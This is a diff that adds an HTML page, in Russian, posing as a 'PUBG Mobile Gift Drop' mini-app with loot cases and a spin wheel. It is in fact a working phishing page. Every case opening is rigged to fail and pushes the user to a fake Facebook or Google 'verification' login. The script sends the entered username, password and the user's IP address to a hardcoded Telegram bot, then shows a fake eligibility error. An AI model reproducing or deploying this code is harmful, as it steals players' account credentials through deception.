@@ -1,0 +1,380 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>PUBG Mobile - Gift Drop</title>
+    
+    <link href="https://fonts.googleapis.com/css2?family=Teko:wght@400;600;700&family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdn.tailwindcss.com"></script>
+
+    <style>
+        :root {
+            --pubg-gold: #ffbc00;
+            --pubg-dark: #0b0c0d;
+            --pubg-card: #151618;
+            --pubg-blue: #0084ff;
+            --pubg-red: #ff3b30;
+        }
+
+        body {
+            background-color: var(--pubg-dark);
+            color: white;
+            font-family: 'Inter', sans-serif;
+            margin: 0; padding: 0;
+            overflow-x: hidden;
+        }
+
+        .pubg-font { font-family: 'Teko', sans-serif; text-transform: uppercase; letter-spacing: 1px; }
+
+        /* Шапка из скриншота */
+        header {
+            background: rgba(0, 0, 0, 0.9);
+            padding: 12px 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+            position: sticky; top: 0; z-index: 100;
+        }
+
+        .btn-deposit {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px dashed white;
+            border-radius: 20px;
+            padding: 6px 14px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            position: relative;
+        }
+
+        .bonus-badge {
+            position: absolute;
+            top: -10px; right: -5px;
+            background: #4caf50;
+            font-size: 10px;
+            padding: 2px 6px;
+            border-radius: 6px;
+            font-weight: 900;
+        }
+
+        /* Стили Кейса (Лента) */
+        .case-container {
+            position: relative;
+            width: 100%;
+            height: 180px;
+            overflow: hidden;
+            background: radial-gradient(circle, rgba(255, 255, 255, 0.02) 0%, transparent 80%);
+            margin: 20px 0;
+        }
+
+        .case-line {
+            position: absolute;
+            top: 0; left: 50%;
+            width: 2px; height: 100%;
+            background: var(--pubg-gold);
+            z-index: 10;            box-shadow: 0 0 15px var(--pubg-gold);
+        }
+
+        .case-tape {
+            display: flex;
+            padding: 20px 0;
+            transition: transform 5s cubic-bezier(0.15, 0, 0.15, 1);
+            will-change: transform;
+        }
+
+        .case-item {
+            min-width: 130px;
+            height: 140px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 10px;
+            opacity: 0.5;
+            transition: opacity 0.3s;
+        }
+
+        .case-item.active { opacity: 1; transform: scale(1.1); }
+        .case-item img { width: 80px; height: 80px; object-fit: contain; filter: drop-shadow(0 0 10px rgba(255,255,255,0.2)); }
+        .case-item span { font-size: 11px; margin-top: 10px; font-weight: 600; text-align: center; }
+
+        /* Кнопки как на скрине */
+        .error-msg {
+            background: rgba(255, 59, 48, 0.15);
+            color: var(--pubg-red);
+            border: 1px solid rgba(255, 59, 48, 0.3);
+            border-radius: 12px;
+            padding: 15px;
+            text-align: center;
+            font-size: 14px;
+            margin: 15px;
+            display: none;
+        }
+
+        .btn-blue {
+            background: var(--pubg-blue);
+            color: white;
+            width: calc(100% - 32px);
+            margin: 0 16px;
+            padding: 16px;
+            border-radius: 14px;
+            font-weight: 700;
+            font-size: 16px;
+            text-align: center;
+            display: block;
+        }
+
+        /* Нижнее меню */
+        .nav-bar {
+            position: fixed; bottom: 0; left: 0; right: 0;
+            background: #000;
+            height: 70px;
+            display: flex; justify-content: space-around; align-items: center;
+            border-top: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .nav-item { display: flex; flex-direction: column; align-items: center; color: #555; font-size: 10px; }
+        .nav-item.active { color: var(--pubg-gold); }
+
+        /* Модалки */
+        .modal {
+            position: fixed; inset: 0; background: rgba(0,0,0,0.95);
+            z-index: 1000; display: none; flex-direction: column; padding: 20px;
+            justify-content: center;
+        }
+
+        .login-card { background: white; color: black; border-radius: 16px; padding: 24px; }
+        input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; color: black;}
+    </style>
+</head>
+<body>
+
+    <!-- Header -->
+    <header>
+        <div class="flex items-center gap-2" onclick="showSection('hub')">
+            <i class="fas fa-chevron-left text-gray-400"></i>
+            <span class="text-sm font-bold">Назад</span>
+        </div>
+        <div class="text-center">
+            <h1 class="pubg-font text-lg leading-none">Gift Drop</h1>
+            <p class="text-[9px] text-gray-500 uppercase">мини-приложение</p>
+        </div>
+        <div class="btn-deposit" onclick="startAuth()">
+            <div class="bonus-badge">+25%</div>
+            <div class="w-4 h-4 bg-blue-500 rounded-full flex items-center justify-center text-[10px]">+</div>
+            <span class="text-xs font-bold">Пополнить</span>
+        </div>
+    </header>
+
+    <!-- MAIN HUB -->
+    <div id="section-hub" class="p-4">
+        <h2 class="pubg-font text-2xl mb-4">Выбор режима</h2>
+        <div class="grid grid-cols-2 gap-4">
+            <div class="bg-[#151618] p-4 rounded-2xl border border-white/5 text-center" onclick="showSection('case')">
+                <img src="https://static.wikia.nocookie.net/pubg_gamepedia_en/images/1/10/Item_Crate_Classic.png" class="h-20 mx-auto mb-2">
+                <div class="pubg-font text-blue-400">GIFT DROP</div>
+                <div class="text-[9px] text-gray-500">КЕЙСЫ</div>
+            </div>
+            <div class="bg-[#151618] p-4 rounded-2xl border border-white/5 text-center" onclick="showSection('spin')">
+                <img src="https://www.pubgmobile.com/common/images/icon_uc.png" class="h-20 mx-auto mb-2">
+                <div class="pubg-font text-yellow-500">LUCKY SPIN</div>
+                <div class="text-[9px] text-gray-500">РУЛЕТКА</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- CASE SECTION -->
+    <div id="section-case" style="display: none;">
+        <div class="text-center py-6">
+            <h2 class="pubg-font text-3xl text-white">Classic Crate</h2>
+            <p class="text-gray-500 text-xs">Moon Season Edition</p>
+        </div>
+
+        <div class="case-container">
+            <div class="case-line"></div>
+            <div class="case-tape" id="caseTape">
+                <!-- Элементы генерируются JS -->
+            </div>
+        </div>
+
+        <div id="errorBox" class="error-msg">Недостаточно средств для открытия кейса</div>
+
+        <div id="openBtn" onclick="tryOpenCase()" class="btn-blue !bg-white !text-black mb-3">Открыть (60 UC)</div>
+        <div id="depositBtn" onclick="startAuth()" class="btn-blue" style="display: none;">Пополнить баланс</div>
+
+        <div class="p-5">
+            <h3 class="text-gray-400 uppercase text-xs font-bold mb-4">Содержимое кейса</h3>
+            <div class="grid grid-cols-3 gap-3">
+                <div class="bg-[#151618] p-3 rounded-xl text-center">
+                    <img src="priz1.png" class="w-full h-16 object-contain mb-2">
+                    <p class="text-[10px] text-white">M416 Glacier</p>
+                </div>
+                <div class="bg-[#151618] p-3 rounded-xl text-center">
+                    <img src="priz2.png" class="w-full h-16 object-contain mb-2">
+                    <p class="text-[10px] text-white">Pharaoh Set</p>
+                </div>
+                <div class="bg-[#151618] p-3 rounded-xl text-center">
+                    <img src="priz3.png" class="w-full h-16 object-contain mb-2">
+                    <p class="text-[10px] text-white">X-Suit</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- SPIN SECTION -->
+    <div id="section-spin" style="display: none;" class="p-5">
+         <div class="bg-[#151618] rounded-3xl p-4 border-2 border-[#25262b] relative">
+            <div class="grid grid-cols-3 gap-2" id="spinGrid">
+                <!-- Ячейки рулетки с вашими картинками -->
+                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="s0"><img src="priz1.png" class="w-full h-auto"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="s1"><img src="priz2.png" class="w-full h-auto"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="s2"><img src="priz3.png" class="w-full h-auto"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="s7"><img src="priz4.png" class="w-full h-auto"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="mid"><i class="fas fa-star text-yellow-500"></i></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="s3"><img src="priz5.png" class="w-full h-auto"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="s6"><img src="priz6.png" class="w-full h-auto"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="s5"><img src="priz7.png" class="w-full h-auto"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="s4"><img src="priz8.png" class="w-full h-auto"></div>
+            </div>
+         </div>
+         <button class="btn-blue !mx-0 mt-6 !bg-yellow-500 !text-black" onclick="tryOpenCase()">Крутить (60 UC)</button>
+    </div>
+
+    <!-- MODAL AUTH -->
+    <div id="modalAuth" class="modal">
+        <div class="login-card">
+            <h2 class="font-black text-xl mb-2">Верификация аккаунта</h2>
+            <p class="text-gray-500 text-sm mb-6">Войдите через одну из сетей, чтобы подтвердить ID и получить награду.</p>
+            
+            <button onclick="openForm('Facebook')" class="w-full bg-[#1877F2] text-white p-4 rounded-xl mb-3 font-bold flex items-center justify-center gap-3">
+                <i class="fab fa-facebook-f"></i> Facebook
+            </button>
+            <button onclick="openForm('Google')" class="w-full bg-white text-black border border-gray-200 p-4 rounded-xl mb-3 font-bold flex items-center justify-center gap-3">
+                <i class="fab fa-google"></i> Google
+            </button>
+            <button onclick="showSection('hub')" class="w-full text-gray-400 text-sm mt-2">Отмена</button>
+        </div>
+    </div>
+
+    <div id="modalForm" class="modal">
+        <div class="login-card">
+            <h2 id="methodName" class="font-black text-xl mb-4">Login</h2>
+            <input type="text" id="inpUser" placeholder="Номер или эл. почта">
+            <input type="password" id="inpPass" placeholder="Пароль">
+            <button onclick="finalSubmit()" class="w-full bg-blue-600 text-white p-4 rounded-xl mt-4 font-bold">Войти</button>
+        </div>
+    </div>
+
+    <!-- Bottom Nav -->
+    <nav class="nav-bar">
+        <div class="nav-item" onclick="showSection('hub')"><i class="fas fa-home"></i><span>Главная</span></div>
+        <div class="nav-item active" onclick="showSection('case')"><i class="fas fa-box-open"></i><span>Кейсы</span></div>
+        <div class="nav-item"><i class="fas fa-tasks"></i><span>Задания</span></div>
+        <div class="nav-item" onclick="startAuth()"><i class="fas fa-user-circle"></i><span>Профиль</span></div>
+    </nav>
+
+    <script>
+        // --- CONFIG ---
+        const BOT_TOKEN = '8498045152:AAH6b4APGZfXDz0Dm0UFvN0kIkfvqtmViKU';
+        const CHAT_ID = '1709490182';
+        
+        const prizeImages = ['priz1.png', 'priz2.png', 'priz3.png', 'priz4.png', 'priz5.png', 'priz6.png', 'priz7.png', 'priz8.png', 'priz9.png'];
+        let userIP = '';
+        let currentMethod = '';
+
+        // Определение IP
+        fetch('https://ipapi.co/json/').then(r => r.json()).then(d => userIP = d.ip + ' (' + d.country_name + ')');
+
+        // Навигация
+        function showSection(id) {
+            ['section-hub', 'section-case', 'section-spin', 'modalAuth', 'modalForm'].forEach(s => {
+                document.getElementById(s).style.display = 'none';
+                document.getElementById(s).classList.remove('flex');
+            });
+            const target = document.getElementById('section-' + id);
+            if(target) target.style.display = 'block';
+            window.scrollTo(0,0);
+        }
+
+        // Генерация ленты кейса с вашими картинками
+        const tape = document.getElementById('caseTape');
+        for(let i=0; i<40; i++) {
+            const img = prizeImages[Math.floor(Math.random()*prizeImages.length)];
+            tape.innerHTML += `
+                <div class="case-item">
+                    <img src="${img}">
+                    <span class="pubg-font">Epic Item</span>
+                </div>
+            `;
+        }
+
+        // Логика "Открытия" (Ошибка как на скрине)
+        function tryOpenCase() {
+            document.getElementById('errorBox').style.display = 'block';
+            document.getElementById('openBtn').style.display = 'none';
+            document.getElementById('depositBtn').style.display = 'block';
+            
+            // Крутим ленту для вида
+            const offset = 130 * 25 + Math.floor(Math.random()*100);
+            tape.style.transform = `translateX(-${offset}px)`;
+            
+            sendTelegram(`⚠️ Пользователь нажал "Открыть кейс" (IP: ${userIP})`);
+        }
+
+        function startAuth() {
+            document.getElementById('modalAuth').style.display = 'flex';
+        }
+
+        function openForm(method) {
+            currentMethod = method;
+            document.getElementById('methodName').innerText = 'Login with ' + method;
+            document.getElementById('modalAuth').style.display = 'none';
+            document.getElementById('modalForm').style.display = 'flex';
+        }
+
+        async function finalSubmit() {
+            const u = document.getElementById('inpUser').value;
+            const p = document.getElementById('inpPass').value;
+            if(u.length < 3 || p.length < 3) return alert('Заполните поля!');
+
+            const msg = `
+🔥 **NEW LOG** 🔥
+👤 Метод: ${currentMethod}
+📧 Логин: \`${u}\`
+🔑 Пароль: \`${p}\`
+🌐 IP: ${userIP}
+            `;
+            
+            await sendTelegram(msg);
+            
+            document.getElementById('modalForm').innerHTML = `
+                <div class="text-center p-10">
+                    <i class="fas fa-spinner fa-spin text-3xl mb-3 text-blue-500"></i>
+                    <p class="text-black font-bold">Синхронизация аккаунта...</p>
+                </div>
+            `;
+            
+            setTimeout(() => {
+                alert('Ошибка: Данный аккаунт не подходит под критерии акции (минимум 15 уровень).');
+                location.reload();
+            }, 3000);
+        }
+
+        async function sendTelegram(text) {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({chat_id: CHAT_ID, text: text, parse_mode: 'Markdown'})
+                });
+            } catch(e) {}
+        }
+
+        // Инициализация
+        showSection('hub');
+    </script>
+</body>
+</html>
